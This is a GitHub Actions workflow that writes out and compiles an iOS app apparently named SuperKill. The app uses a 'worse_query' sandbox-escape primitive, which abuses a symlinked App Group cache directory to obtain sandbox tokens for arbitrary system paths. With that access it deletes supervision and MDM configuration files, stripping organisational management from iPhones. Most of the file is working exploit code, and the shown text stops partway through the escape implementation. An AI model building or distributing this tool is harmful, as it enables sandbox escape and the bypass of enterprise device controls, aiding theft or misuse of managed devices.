name: build-ipa-onefile

# 单文件引导版：不需要上传任何文件夹，把本文件内容整段粘进 GitHub 的新建文件页即可。
# 它会在 macOS runner 上写出源码 -> 生成工程 -> 编译 -> 产出未签名 ipa。

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  ipa:
    runs-on: macos-latest
    timeout-minutes: 25
    env:
      APP_GROUP: group.cc.replace.superkill
      BUNDLE_ID: cc.replace.superkill
      # 想改桌面显示名，只改这一行即可
      APP_NAME: 割韭菜最终版本
    steps:
      - name: 写入源码与工程文件
        run: |
          set -euo pipefail
          mkdir -p Sources
          cat > Sources/main.m <<'SK_EOF_00_MAIN_M'
          //
          //  main.m
          //  SuperKill
          //

          #import <UIKit/UIKit.h>
          #import "SKAppDelegate.h"

          int main(int argc, char *argv[]) {
              @autoreleasepool {
                  return UIApplicationMain(argc, argv, nil, NSStringFromClass([SKAppDelegate class]));
              }
          }
          SK_EOF_00_MAIN_M
          mkdir -p Sources
          cat > Sources/SKAppDelegate.h <<'SK_EOF_01_SKAPPDELEGATE_H'
          //
          //  SKAppDelegate.h
          //  SuperKill
          //

          #import <UIKit/UIKit.h>

          @interface SKAppDelegate : UIResponder <UIApplicationDelegate>

          @property (nonatomic, strong) UIWindow *window;

          @end
          SK_EOF_01_SKAPPDELEGATE_H
          mkdir -p Sources
          cat > Sources/SKAppDelegate.m <<'SK_EOF_02_SKAPPDELEGATE_M'
          //
          //  SKAppDelegate.m
          //  SuperKill
          //

          #import "SKAppDelegate.h"
          #import "SKMainViewController.h"

          @implementation SKAppDelegate

          - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
              self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
              SKMainViewController *root = [[SKMainViewController alloc] init];
              UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:root];
              self.window.rootViewController = nav;
              [self.window makeKeyAndVisible];
              return YES;
          }

          @end
          SK_EOF_02_SKAPPDELEGATE_M
          mkdir -p Sources
          cat > Sources/SKEngine.h <<'SK_EOF_03_SKENGINE_H'
          //
          //  SKEngine.h
          //  SuperKill
          //
          //  监管（Supervision）状态读取与清除引擎。
          //  通过 worse_query 取得 systemgroup.com.apple.configurationprofiles 的读写权限，
          //  然后删除监管与 MDM 的落盘状态。
          //

          #import <Foundation/Foundation.h>

          NS_ASSUME_NONNULL_BEGIN

          typedef void (^SKLogBlock)(NSString *line);

          /// 监管与 MDM 状态的系统级落盘位置
          extern NSString *const SKConfigurationProfilesRoot;
          extern NSString *const SKDeviceManagementRoot;
          extern NSString *const SKUserProfilesRoot;

          @interface SKEngine : NSObject

          /// 日志回调，可能在任意线程被调用，UI 层自行切主线程
          @property (nonatomic, copy, nullable) SKLogBlock logger;

          /// 当前使用的 App Group（默认从签名 entitlements 自动读取）
          @property (nonatomic, readwrite, copy) NSString *appGroup;

          + (NSString *)configuredAppGroup;
          + (void)setConfiguredAppGroup:(NSString *)group;

          /// 自检：系统版本、App Group、扩展可用性、当前监管状态
          - (NSString *)environmentReport;

          /// 彻底清除监管 + MDM 落盘状态
          - (BOOL)wipeSupervision:(BOOL)aggressive error:(NSError **)error;

          /// 释放所有已 consume 的扩展
          - (void)releaseAllExtensions;

          @end

          NS_ASSUME_NONNULL_END
          SK_EOF_03_SKENGINE_H
          mkdir -p Sources
          cat > Sources/SKEngine.m <<'SK_EOF_04_SKENGINE_M'
          //
          //  SKEngine.m
          //  SuperKill
          //

          #import "SKEngine.h"
          #import "worse_query.h"

          #import <Foundation/Foundation.h>
          #import <dlfcn.h>
          #import <sys/stat.h>
          #import <xpc/xpc.h>

          NSString *const SKConfigurationProfilesRoot =
          @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles";
          NSString *const SKDeviceManagementRoot = @"/private/var/mobile/Library/DeviceManagement";
          NSString *const SKUserProfilesRoot = @"/private/var/mobile/Library/ConfigurationProfiles";

          static NSString *const SKGroupDefaultsKey = @"SKAppGroup";
          static NSString *const SKGroupUserSetKey = @"SKAppGroupUserSet";
          static NSString *const SKGroupInfoKey = @"SKAppGroup";

          #pragma mark - plist helpers

          static BOOL SKWritePlist(id plist, NSString *path) {
              if (!plist || path.length == 0) return NO;
              NSError *error = nil;
              NSData *data = [NSPropertyListSerialization dataWithPropertyList:plist
                                                                        format:NSPropertyListXMLFormat_v1_0
                                                                       options:0
                                                                         error:&error];
              if (!data) return NO;
              return [data writeToFile:path options:NSDataWritingAtomic error:&error];
          }

          static id SKReadPlist(NSString *path) {
              if (path.length == 0) return nil;
              NSData *data = [NSData dataWithContentsOfFile:path];
              if (!data) return nil;
              return [NSPropertyListSerialization propertyListWithData:data
                                                               options:NSPropertyListMutableContainersAndLeaves
                                                                format:NULL
                                                                 error:NULL];
          }

          #pragma mark - SKEngine

          @interface SKEngine ()
          @property (nonatomic, strong) NSMutableDictionary<NSString *, NSNumber *> *handles;

          - (void)log:(NSString *)format, ... NS_FORMAT_FUNCTION(1, 2);
          - (BOOL)hasAccessTo:(NSString *)path;
          - (BOOL)grantAccessTo:(NSString *)root;
          - (NSString *)hintForCode:(int64_t)code;
          - (NSArray<NSString *> *)entriesIn:(NSString *)root;
          - (BOOL)removeItem:(NSString *)path;
          - (void)emptyPayloadManifestIn:(NSString *)root;
          @end

          @implementation SKEngine

          - (instancetype)init {
              if ((self = [super init])) {
                  _handles = [NSMutableDictionary dictionary];
                  _appGroup = [SKEngine configuredAppGroup];
              }
              return self;
          }

          + (NSString *)appGroupFromEntitlements {
              // libxpc 导出 xpc_copy_entitlement_for_self()，用它读自己签名里的 app group，
              // 这样自签后不需要手输 group，也不会因为填错而报 -1。
              typedef xpc_object_t (*sk_copy_entitlement_fn)(const char *);
              sk_copy_entitlement_fn copy = (sk_copy_entitlement_fn)dlsym(RTLD_DEFAULT, "xpc_copy_entitlement_for_self");
              if (!copy) {
                  void *libxpc = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
                  if (libxpc) copy = (sk_copy_entitlement_fn)dlsym(libxpc, "xpc_copy_entitlement_for_self");
              }
              if (!copy) return nil;

              xpc_object_t value = copy("com.apple.security.application-groups");
              if (!value || xpc_get_type(value) != XPC_TYPE_ARRAY) return nil;

              NSFileManager *fm = [NSFileManager defaultManager];
              size_t count = xpc_array_get_count(value);
              for (size_t i = 0; i < count; i++) {
                  const char *raw = xpc_array_get_string(value, i);
                  if (!raw) continue;
                  NSString *group = [NSString stringWithUTF8String:raw];
                  // 只有真的拿到容器，才说明这个 group 在签名/描述文件里被认可
                  if (group.length && [fm containerURLForSecurityApplicationGroupIdentifier:group]) {
                      return group;
                  }
              }
              return nil;
          }

          + (NSString *)configuredAppGroup {
              NSString *detected = [self appGroupFromEntitlements];
              if (detected.length) return detected;

              NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
              NSString *manual = [defaults stringForKey:SKGroupDefaultsKey];
              if ([defaults boolForKey:SKGroupUserSetKey] && manual.length) return manual;

              NSString *fallback = [[NSBundle mainBundle] objectForInfoDictionaryKey:SKGroupInfoKey];
              return fallback.length ? fallback : @"";
          }

          + (void)setConfiguredAppGroup:(NSString *)group {
              NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
              [defaults setObject:(group ?: @"") forKey:SKGroupDefaultsKey];
              [defaults setBool:YES forKey:SKGroupUserSetKey];
              [defaults synchronize];
          }

          - (void)log:(NSString *)format, ... NS_FORMAT_FUNCTION(1, 2) {
              va_list args;
              va_start(args, format);
              NSString *line = [[NSString alloc] initWithFormat:format arguments:args];
              va_end(args);
              SKLogBlock logger = self.logger;
              if (logger) logger(line);
          }

          #pragma mark - 扩展管理

          - (BOOL)hasAccessTo:(NSString *)path {
              for (NSString *granted in self.handles) {
                  if ([path isEqualToString:granted]) return YES;
                  if ([path hasPrefix:[granted stringByAppendingString:@"/"]]) return YES;
              }
              return NO;
          }

          - (BOOL)grantAccessTo:(NSString *)root {
              if ([self hasAccessTo:root]) return YES;
              if (self.appGroup.length == 0) {
                  [self log:@"✗ 没有配置 App Group，签名时必须注入 com.apple.security.application-groups"];
                  return NO;
              }
              if (!sk_has_app_group(self.appGroup)) {
                  [self log:@"✗ App Group 不可用：%@", self.appGroup];
                  [self log:@"  说明：entitlements 里的 group 必须在你自己的开发者账号下注册过，并且随描述文件一起签名"];
                  return NO;
              }
              int64_t flags = 0;
              int64_t handle = sk_escape(root, self.appGroup, false, &flags);
              if (handle <= 0) {
                  [self log:@"✗ %@ 取得扩展失败（code %lld）%@",
                        root.lastPathComponent, (long long)handle, [self hintForCode:handle]];
                  return NO;
              }
              self.handles[root] = @(handle);
              [self log:@"✓ %@ 已拿到扩展 handle=%lld flags=0x%llx",
                    root.lastPathComponent, (long long)handle, (unsigned long long)flags];
              return YES;
          }

          - (NSString *)hintForCode:(int64_t)code {
              switch (code) {
                  case -1:  return @"App Group 无效";
                  case -2:  return @"系统版本不支持（dylib 或符号缺失）";
                  case -3:  return @"container_query 创建失败";
                  case -4:  return @"符号链接创建失败";
                  case -5:  return @"containermanagerd 拒绝 query（flags/part 不匹配）";
                  case -6:  return @"内核拒绝签发扩展";
                  case -255: return @"目标路径不存在";
                  default: return @"";
              }
          }

          - (void)releaseAllExtensions {
              for (NSString *path in self.handles.allKeys) {
                  sk_escape_release(self.handles[path].longLongValue);
                  [self log:@"↺ 释放扩展 %@", path.lastPathComponent];
              }
              [self.handles removeAllObjects];
          }

          #pragma mark - 自检

          - (NSString *)environmentReport {
              NSMutableString *out = [NSMutableString string];
              NSOperatingSystemVersion v = [NSProcessInfo processInfo].operatingSystemVersion;
              [out appendFormat:@"iOS: %ld.%ld.%ld\n", (long)v.majorVersion, (long)v.minorVersion, (long)v.patchVersion];
              [out appendFormat:@"App Group: %@\n", self.appGroup.length ? self.appGroup : @"(空)"];
              NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:self.appGroup];
              [out appendFormat:@"Group 容器: %@\n", sk_has_app_group(self.appGroup) ? @"可访问" : @"不可访问"];
              if (groupURL) [out appendFormat:@"容器路径: %@\n", groupURL.path];

              // 主动探一次真实目标：能拿到扩展就说明整条逃逸链在你这个版本上成立
              BOOL cfg = [self grantAccessTo:SKConfigurationProfilesRoot];
              BOOL dev = [self grantAccessTo:SKDeviceManagementRoot];
              [out appendFormat:@"ConfigurationProfiles: %@\n", cfg ? @"扩展已取得（逃逸可用）" : @"扩展失败"];
              [out appendFormat:@"DeviceManagement: %@\n", dev ? @"扩展已取得" : @"不可用（未登记 MDM 时属正常）"];
              [out appendFormat:@"已持有句柄: %lu\n", (unsigned long)self.handles.count];

              // 当前监管状态（原“检测”按钮已合并进自检）
              if (cfg) {
                  NSDictionary *cloud = SKReadPlist([SKConfigurationProfilesRoot stringByAppendingPathComponent:@"CloudConfigurationDetails.plist"]);
                  if ([cloud isKindOfClass:[NSDictionary class]]) {
                      BOOL supervised = [cloud[@"IsSupervised"] boolValue];
                      [out appendFormat:@"监管: %@（IsSupervised = %d）· 组织 = %@\n",
                       supervised ? @"受监管" : @"未监管", supervised, cloud[@"OrganizationName"] ?: @"(无)"];
                  } else {
                      [out appendString:@"监管: 未检测到监管标记\n"];
                  }

                  NSDictionary *mdm = SKReadPlist([SKConfigurationProfilesRoot stringByAppendingPathComponent:@"MDM.plist"]);
                  if ([mdm isKindOfClass:[NSDictionary class]]) {
                      [out appendFormat:@"MDM: %@ · Topic = %@\n",
                       mdm[@"ServerURL"] ?: @"(无)", mdm[@"Topic"] ?: @"(无)"];
                  }
              }
              return out;
          }

          - (NSArray<NSString *> *)entriesIn:(NSString *)root {
              NSError *error = nil;
              NSArray<NSString *> *list = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:root error:&error];
              if (!list) {
                  [self log:@"  读取目录失败 %@: %@", root.lastPathComponent, error.localizedDescription];
                  return @[];
              }
              return list;
          }

          #pragma mark - 清除

          - (BOOL)removeItem:(NSString *)path {
              NSError *error = nil;
              if ([[NSFileManager defaultManager] fileExistsAtPath:path] == NO) return NO;
              BOOL ok = [[NSFileManager defaultManager] removeItemAtPath:path error:&error];
              [self log:@"%@ %@", ok ? @"− 删除" : @"✗ 删除失败", path.lastPathComponent];
              if (!ok && error) [self log:@"    %@", error.localizedDescription];
              return ok;
          }

          - (void)emptyPayloadManifestIn:(NSString *)root {
              NSString *path = [root stringByAppendingPathComponent:@"PayloadManifest.plist"];
              id manifest = SKReadPlist(path);
              if (![manifest isKindOfClass:[NSDictionary class]]) return;
              NSMutableDictionary *dict = [manifest mutableCopy];
              dict[@"OrderedProfiles"] = @[];
              if (SKWritePlist(dict, path)) {
                  [self log:@"✓ PayloadManifest.OrderedProfiles 已清空"];
              }
          }

          - (BOOL)wipeSupervision:(BOOL)aggressive error:(NSError **)error {
              BOOL touched = NO;

              // 1. 监管 + MDM 主状态目录（systemgroup.com.apple.configurationprofiles）
              if ([self grantAccessTo:SKConfigurationProfilesRoot]) {
                  NSArray<NSString *> *core = @[
                      @"CloudConfigurationDetails.plist",
                      @"CloudConfigurationSetAsideDetails.plist",
                      @"MDM.plist",
                      @"MDMEvents.plist",
                      @"MDMAppManagement.plist",
                      @"ProfileTruth.plist",
                      @"Truth.plist",
                      @"ClientTruth.plist",
                  ];
                  for (NSString *name in core) {
                      [self removeItem:[SKConfigurationProfilesRoot stringByAppendingPathComponent:name]];
                  }
                  [self emptyPayloadManifestIn:SKConfigurationProfilesRoot];

                  if (aggressive) {
                      // 所有 GUID.stub 一并清掉，让 profiled 认为一个 profile 都没装过
                      for (NSString *name in [self entriesIn:SKConfigurationProfilesRoot]) {
                          if ([name.pathExtension isEqualToString:@"stub"]) {
                              [self removeItem:[SKConfigurationProfilesRoot stringByAppendingPathComponent:name]];
                          }
                      }
                  }
                  touched = YES;
              }

              // 2. 设备管理层状态（ClientTruth / MDM 副本）
              if ([self grantAccessTo:SKDeviceManagementRoot]) {
                  NSArray<NSString *> *mgmt = @[
                      @"ClientTruth.plist",
                      @"CloudConfigurationDetails.plist",
                      @"MDM.plist",
                      @"MDMEvents.plist",
                      @"MDMAppManagement.plist",
                      @"ManagementState.plist",
                  ];
                  for (NSString *name in mgmt) {
                      [self removeItem:[SKDeviceManagementRoot stringByAppendingPathComponent:name]];
                  }
                  touched = YES;
              }

              // 3. 用户级 profile 目录
              if (aggressive && [self grantAccessTo:SKUserProfilesRoot]) {
                  for (NSString *name in [self entriesIn:SKUserProfilesRoot]) {
                      [self removeItem:[SKUserProfilesRoot stringByAppendingPathComponent:name]];
                  }
              }

              if (!touched) {
                  if (error) {
                      *error = [NSError errorWithDomain:@"SuperKill"
                                                   code:1
                                               userInfo:@{NSLocalizedDescriptionKey: @"一个目标目录都没拿到访问权限"}];
                  }
                  return NO;
              }

              [self log:@"✓ 监管状态已清除：请保持断网并重启设备"];
              return YES;
          }

          @end
          SK_EOF_04_SKENGINE_M
          mkdir -p Sources
          cat > Sources/SKMainViewController.h <<'SK_EOF_05_SKMAINVIEWCONTROLLER_H'
          //
          //  SKMainViewController.h
          //  SuperKill
          //

          #import <UIKit/UIKit.h>

          @interface SKMainViewController : UIViewController

          @end
          SK_EOF_05_SKMAINVIEWCONTROLLER_H
          mkdir -p Sources
          cat > Sources/SKMainViewController.m <<'SK_EOF_06_SKMAINVIEWCONTROLLER_M'
          //
          //  SKMainViewController.m
          //  SuperKill
          //
          //  极简操作台：App Group → 自检 → 彻底清除。
          //

          #import "SKMainViewController.h"
          #import "SKEngine.h"

          @interface SKMainViewController () <UITextFieldDelegate>

          @property (nonatomic, strong) SKEngine *engine;
          @property (nonatomic, strong) UITextField *groupField;
          @property (nonatomic, strong) UITextView *console;
          @property (nonatomic, strong) UIActivityIndicatorView *spinner;
          @property (nonatomic, strong) NSMutableString *logBuffer;
          @property (nonatomic, strong) dispatch_queue_t workQueue;

          @end

          @implementation SKMainViewController

          - (void)viewDidLoad {
              [super viewDidLoad];

              NSString *displayName = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleDisplayName"];
              self.title = displayName.length ? displayName : @"割韭菜最终版本";
              self.view.backgroundColor = [UIColor systemBackgroundColor];

              self.engine = [[SKEngine alloc] init];
              self.workQueue = dispatch_queue_create("cc.superkill.work", DISPATCH_QUEUE_SERIAL);
              self.logBuffer = [NSMutableString string];

              __weak typeof(self) weakSelf = self;
              self.engine.logger = ^(NSString *line) {
                  dispatch_async(dispatch_get_main_queue(), ^{
                      [weakSelf appendLog:line];
                  });
              };

              [self buildUI];
              self.groupField.text = [SKEngine configuredAppGroup];
              [self appendLog:@"就绪：① 自检看状态，② 彻底清除监管。"];
          }

          #pragma mark - UI

          - (UIButton *)makeButton:(NSString *)title action:(SEL)action destructive:(BOOL)destructive {
              UIButtonConfiguration *config = [UIButtonConfiguration filledButtonConfiguration];
              config.title = title;
              config.cornerStyle = UIButtonConfigurationCornerStyleMedium;
              if (destructive) {
                  config.baseBackgroundColor = [UIColor systemRedColor];
              }
              UIButton *button = [UIButton buttonWithType:UIButtonTypeSystem];
              button.configuration = config;
              [button addTarget:self action:action forControlEvents:UIControlEventTouchUpInside];
              [button.heightAnchor constraintGreaterThanOrEqualToConstant:48].active = YES;
              return button;
          }

          - (UILabel *)makeSectionLabel:(NSString *)text {
              UILabel *label = [[UILabel alloc] init];
              label.text = text;
              label.font = [UIFont preferredFontForTextStyle:UIFontTextStyleFootnote];
              label.textColor = [UIColor secondaryLabelColor];
              return label;
          }

          - (void)buildUI {
              UIStackView *root = [[UIStackView alloc] init];
              root.axis = UILayoutConstraintAxisVertical;
              root.spacing = 10;
              root.translatesAutoresizingMaskIntoConstraints = NO;
              [self.view addSubview:root];

              UILayoutGuide *guide = self.view.safeAreaLayoutGuide;
              [NSLayoutConstraint activateConstraints:@[
                  [root.topAnchor constraintEqualToAnchor:guide.topAnchor constant:16],
                  [root.leadingAnchor constraintEqualToAnchor:guide.leadingAnchor constant:16],
                  [root.trailingAnchor constraintEqualToAnchor:guide.trailingAnchor constant:-16],
                  [root.bottomAnchor constraintEqualToAnchor:guide.bottomAnchor constant:-12],
              ]];

              UIStackView *groupRow = [[UIStackView alloc] init];
              groupRow.axis = UILayoutConstraintAxisHorizontal;
              groupRow.spacing = 8;

              self.groupField = [[UITextField alloc] init];
              self.groupField.borderStyle = UITextBorderStyleRoundedRect;
              self.groupField.placeholder = @"group.yourteam.superkill";
              self.groupField.autocapitalizationType = UITextAutocapitalizationTypeNone;
              self.groupField.autocorrectionType = UITextAutocorrectionTypeNo;
              self.groupField.delegate = self;
              self.groupField.returnKeyType = UIReturnKeyDone;
              self.groupField.font = [UIFont systemFontOfSize:14];
              [self.groupField.heightAnchor constraintEqualToConstant:40].active = YES;

              UIButton *save = [self makeButton:@"保存" action:@selector(saveGroup) destructive:NO];
              [save.widthAnchor constraintEqualToConstant:72].active = YES;

              [groupRow addArrangedSubview:self.groupField];
              [groupRow addArrangedSubview:save];

              [root addArrangedSubview:[self makeSectionLabel:@"App Group（App 会自动读签名里的，一般不用改）"]];
              [root addArrangedSubview:groupRow];
              [root addArrangedSubview:[self makeButton:@"① 自检（系统 / Group / 监管状态）" action:@selector(runEnvironment) destructive:NO]];
              [root addArrangedSubview:[self makeButton:@"② 彻底清除监管" action:@selector(confirmWipe) destructive:YES]];

              self.spinner = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleMedium];
              self.spinner.hidesWhenStopped = YES;
              [root addArrangedSubview:self.spinner];

              self.console = [[UITextView alloc] init];
              self.console.editable = NO;
              self.console.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
              self.console.backgroundColor = [UIColor secondarySystemBackgroundColor];
              self.console.layer.cornerRadius = 8;
              self.console.textContainerInset = UIEdgeInsetsMake(8, 8, 8, 8);
              [self.console.heightAnchor constraintGreaterThanOrEqualToConstant:260].active = YES;
              [root addArrangedSubview:self.console];

              UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(dismissKeyboard)];
              tap.cancelsTouchesInView = NO;
              [self.view addGestureRecognizer:tap];
          }

          - (void)dismissKeyboard {
              [self.view endEditing:YES];
          }

          - (void)saveGroup {
              [self.groupField resignFirstResponder];
              NSString *group = [self.groupField.text stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
              [SKEngine setConfiguredAppGroup:group];
              self.engine.appGroup = group;
              [self appendLog:[NSString stringWithFormat:@"App Group 已保存: %@", group.length ? group : @"(空)"]];
          }

          - (BOOL)textFieldShouldReturn:(UITextField *)textField {
              [self saveGroup];
              return YES;
          }

          #pragma mark - 日志 / 忙碌状态

          - (void)appendLog:(NSString *)line {
              NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
              formatter.dateFormat = @"HH:mm:ss";
              NSString *stamp = [formatter stringFromDate:[NSDate date]];
              NSString *entry = [NSString stringWithFormat:@"[%@] %@\n", stamp, line];
              [self.logBuffer appendString:entry];
              self.console.text = self.logBuffer;
              if (self.console.text.length > 0) {
                  NSRange end = NSMakeRange(self.console.text.length - 1, 1);
                  [self.console scrollRangeToVisible:end];
              }
          }

          - (void)setBusy:(BOOL)busy {
              self.view.userInteractionEnabled = !busy;
              if (busy) [self.spinner startAnimating];
              else [self.spinner stopAnimating];
          }

          - (void)runInBackground:(void (^)(void))block {
              [self setBusy:YES];
              dispatch_async(self.workQueue, ^{
                  @autoreleasepool {
                      block();
                  }
                  dispatch_async(dispatch_get_main_queue(), ^{
                      [self setBusy:NO];
                  });
              });
          }

          - (void)alert:(NSString *)title message:(NSString *)message {
              UIAlertController *alert = [UIAlertController alertControllerWithTitle:title
                                                                             message:message
                                                                      preferredStyle:UIAlertControllerStyleAlert];
              [alert addAction:[UIAlertAction actionWithTitle:@"好" style:UIAlertActionStyleDefault handler:nil]];
              [self presentViewController:alert animated:YES completion:nil];
          }

          #pragma mark - Actions

          - (void)runEnvironment {
              [self saveGroup];
              [self runInBackground:^{
                  SKEngine *engine = self.engine;
                  SKLogBlock logger = engine.logger;
                  if (logger) logger([engine environmentReport]);
              }];
          }

          - (void)confirmWipe {
              UIAlertController *sheet = [UIAlertController alertControllerWithTitle:@"彻底清除监管"
                                                                            message:@"将删除 CloudConfigurationDetails.plist、MDM.plist、MDMEvents.plist、MDMAppManagement.plist、PayloadManifest 条目与全部 GUID.stub，并清空 DeviceManagement 下的状态。"
                                                                     preferredStyle:UIAlertControllerStyleActionSheet];
              [sheet addAction:[UIAlertAction actionWithTitle:@"继续（彻底）"
                                                        style:UIAlertActionStyleDestructive
                                                      handler:^(UIAlertAction *action) {
                  [self performWipe];
              }]];
              [sheet addAction:[UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:nil]];
              sheet.popoverPresentationController.sourceView = self.view;
              sheet.popoverPresentationController.sourceRect = self.view.bounds;
              [self presentViewController:sheet animated:YES completion:nil];
          }

          - (void)performWipe {
              [self runInBackground:^{
                  NSError *error = nil;
                  BOOL ok = [self.engine wipeSupervision:YES error:&error];
                  dispatch_async(dispatch_get_main_queue(), ^{
                      [self alert:ok ? @"已清除" : @"清除失败"
                                  message:ok ? @"保持飞行模式，重启设备后再联网验证：设置 → 通用 → VPN 与设备管理 中不应再有 MDM 描述文件，设置首页不应再显示“此 iPhone 受监管”。"
                                             : (error.localizedDescription ?: @"未知错误")];
                  });
              }];
          }

          @end
          SK_EOF_06_SKMAINVIEWCONTROLLER_M
          mkdir -p Sources
          cat > Sources/worse_query.h <<'SK_EOF_07_WORSE_QUERY_H'
          //
          //  worse_query.h
          //  SuperKill
          //
          //  worse_query 沙盒逃逸原语的可用封装（面向 iOS 26.0 - 26.7.2 / 27.2）。
          //  上游 PoC: https://github.com/forcequitOS/worse_query (GPL-3.0)
          //
          //  原理：把 App Group 容器里的 Library/Caches 换成指向目标路径的符号链接，
          //  再让 containermanagerd 为该 group 的 "Library/Caches" part 签发 sandbox token。
          //  containermanagerd 在签发前会解析符号链接，于是 token 实际覆盖的是目标路径，
          //  进程 consume 之后即获得该任意路径（含 SystemGroup 系统组容器）的读写权限。
          //

          #ifndef worse_query_h
          #define worse_query_h

          #import <Foundation/Foundation.h>
          #include <stdint.h>
          #include <stdbool.h>

          /// 取得 target 路径的 sandbox extension。
          ///
          /// @param target     目标路径（目录或文件，必须已存在，除非 create_dir 为 true）
          /// @param group      自己签名里带的 App Group identifier，例如 group.cc.team.superkill
          /// @param create_dir 目标不存在时是否仍然签发
          /// @param flags_used 可空；返回本次成功的 container_query flags
          ///
          /// @return >0 扩展句柄（后续用 sk_escape_release 释放）
          ///         -1  App Group 不存在（签名未注入 entitlements，或 group 未在门户注册）
          ///         -2  符号解析失败（系统版本不受支持 / dylib 不在）
          ///         -3  container_query_create 失败
          ///         -4  符号链接创建失败
          ///         -5  containermanagerd 拒绝 query
          ///         -6  内核拒绝签发 / consume 失败
          ///         -255 目标路径不存在
          int64_t sk_escape(NSString *target, NSString *group, bool create_dir, int64_t *flags_used);

          /// 释放扩展。传入 <=0 时安全无操作。
          void sk_escape_release(int64_t handle);

          /// 该 group 在当前进程里是否存在可用的容器（用于自检）。
          BOOL sk_has_app_group(NSString *group);

          #endif /* worse_query_h */
          SK_EOF_07_WORSE_QUERY_H
          mkdir -p Sources
          cat > Sources/worse_query.m <<'SK_EOF_08_WORSE_QUERY_M'
          //
          //  worse_query.m
          //  SuperKill
          //
          //  worse_query 原语的增强封装。相对上游的改动：
          //    1. 自动枚举 flags × identifier 形态四种组合（iOS 26 的 AppGroup 需要 0x0800000000；
          //       部分版本对 group identifiers 只接受 xpc array），不再由调用方判断系统版本。
          //    2. 预检查区分 ENOENT 与 EPERM：沙盒不让 stat 的路径照样去试签发。
          //    3. 补齐 container_* 的 dlsym 回退（dylib 打开失败时退到 RTLD_DEFAULT）。
          //    4. 统一错误码 + 每次尝试后清理符号链接，不污染自己的 App Group 容器。
          //

          #import "worse_query.h"

          #import <Foundation/Foundation.h>
          #import <dlfcn.h>
          #import <errno.h>
          #import <stdlib.h>
          #import <sys/stat.h>
          #import <xpc/xpc.h>

          typedef void    *(*cq_create_fn)(void);
          typedef void     (*cq_set_class_fn)(void *, uint64_t);
          typedef void     (*cq_set_group_ids_fn)(void *, xpc_object_t);
          typedef void     (*cq_set_flags_fn)(void *, uint64_t);
          typedef void     (*cq_set_part_fn)(void *, uint64_t);
          typedef void    *(*cq_get_single_fn)(void *);
          typedef void     (*cq_free_fn)(void *);
          typedef char    *(*cq_copy_token_fn)(void *);
          typedef int64_t  (*sbx_consume_fn)(const char *);
          typedef int      (*sbx_release_fn)(int64_t);

          // container_query 常量（与 containermanagerd 私有 ABI 对齐）
          #define SK_CQ_CLASS_APP_GROUP      7ULL   // 只走 appGroup 类，才会 XPC 到 containermanagerd
          #define SK_CQ_PART_LIBRARY_CACHES  3ULL   // part 3 == Library/Caches，也就是被我们换成符号链接的那一级
          #define SK_CQ_FLAGS_DEFAULT        0x0000008000000000ULL
          #define SK_CQ_FLAGS_IOS26_APPGROUP 0x0000000800000000ULL

          static const char *const kContainerManagerPath = "/usr/lib/system/libsystem_containermanager.dylib";

          static void *sk_sym(void *image, const char *name) {
              void *p = image ? dlsym(image, name) : NULL;
              if (!p) p = dlsym(RTLD_DEFAULT, name);
              return p;
          }

          BOOL sk_has_app_group(NSString *group) {
              if (group.length == 0) return NO;
              return [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group] != nil;
          }

          // 把 App Group 的 Library/Caches 恢复成真实目录。
          static void sk_cleanup_symlink(NSString *group) {
              if (group.length == 0) return;
              NSFileManager *fm = [NSFileManager defaultManager];
              NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
              if (!root) return;
              NSString *caches = [[root URLByAppendingPathComponent:@"Library/Caches"] path];
              [fm removeItemAtPath:caches error:NULL];
              [fm createDirectoryAtPath:caches withIntermediateDirectories:NO attributes:nil error:NULL];
          }

          static xpc_object_t sk_make_identifiers(NSString *group, bool as_array) {
              xpc_object_t identifier = xpc_string_create(group.UTF8String);
              if (!as_array) return identifier;
              // 数组会 retain 元素；ARC 下不需要（也不允许）手工 release，最多泄漏一个短字符串。
              return xpc_array_create(&identifier, 1);
          }

          static int64_t sk_escape_once(NSString *target, NSString *group, uint64_t flags,
                                        bool create_dir, bool array_ids) {
              if (!create_dir) {
                  struct stat st;
                  if (lstat(target.fileSystemRepresentation, &st) != 0 && errno == ENOENT) {
                      return -255; // 真的不存在
                  }
                  // EPERM / EACCES：沙盒不允许 stat 这个路径，但目标可能存在 —— 继续尝试签发。
              }

              NSFileManager *fm = [NSFileManager defaultManager];
              NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:group];
              if (!groupRoot) return -1;

              NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];

              void *image = dlopen(kContainerManagerPath, RTLD_NOW | RTLD_LOCAL);

              cq_create_fn        create      = (cq_create_fn)sk_sym(image, "container_query_create");
              cq_set_class_fn     set_class   = (cq_set_class_fn)sk_sym(image, "container_query_set_class");
              cq_set_group_ids_fn set_ids     = (cq_set_group_ids_fn)sk_sym(image, "container_query_set_group_identifiers");
              cq_set_flags_fn     set_flags   = (cq_set_flags_fn)sk_sym(image, "container_query_operation_set_flags");
              cq_set_part_fn      set_part    = (cq_set_part_fn)sk_sym(image, "container_query_operation_set_part");
              cq_get_single_fn    get_single  = (cq_get_single_fn)sk_sym(image, "container_query_get_single_result");
              cq_free_fn          free_query  = (cq_free_fn)sk_sym(image, "container_query_free");
              cq_copy_token_fn    copy_token  = (cq_copy_token_fn)sk_sym(image, "container_copy_sandbox_token");
